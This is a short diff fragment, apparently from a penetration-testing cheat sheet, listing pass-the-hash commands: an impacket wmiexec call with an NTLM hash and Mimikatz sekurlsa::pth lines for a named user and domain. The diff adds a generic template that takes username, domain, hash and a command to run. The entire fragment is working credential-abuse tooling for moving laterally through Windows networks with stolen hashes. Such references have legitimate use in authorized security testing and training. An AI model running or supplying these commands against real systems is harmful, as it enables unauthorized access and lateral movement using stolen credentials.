@@ -11,3 +11,5 @@ impacket-wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be648
 [Mimikatz]
 privilege::debug
 sekurlsa::pth /user:qwery /domain:domain.local /ntlm:184fb5e5178480be64824d4cd53b99ee
+
+sekurlsa::pth /user:USERNAME /domain:DOMAIN /ntlm:HASH /run:COMMAND
